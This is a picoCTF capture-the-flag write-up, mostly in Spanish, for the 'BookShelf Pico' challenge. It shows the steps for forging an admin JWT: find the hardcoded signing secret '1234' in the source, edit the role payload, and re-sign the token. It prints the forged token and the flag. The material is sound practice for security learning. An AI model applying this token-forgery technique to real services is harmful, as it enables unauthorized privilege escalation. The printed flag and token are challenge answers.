## Descripción
BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/481/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:49690/).

## Solución
Se abre la página web y se ingresan las credenciales
Una vez iniciada sesión solo se puede leer un libro que es de categoría Free
Dentro de la sección de storage de las herramientas de desarrollador se tiene un jwt token y un payload con los datos del usuario, con ayuda de un descifrador de tokens jwt se cambian los datos a:
```
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1745302002,
  "iat": 1744697202,
  "userId": 2,
  "email": "admin"
}
```
Para saber el secreto se analiza el código y dentro de un generador de strings random en realidad solo se devuelve siempre el string 1234 por lo que ese es el secreto y el token quedaría así:
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUzMDIwMDIsImlhdCI6MTc0NDY5NzIwMiwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.ZvZH1uvS7VWXozMSErYyutF9xhcrurE5E65U9QG96wM`

Se envia y se cambia el payload por los mismos datos de admin
Se recarga la página y se puede leer el archivo con la bandera

```
picoCTF{w34k_jwt_n0t_g00d_ca4d9701}
```

## Referencias
* https://jwt.io/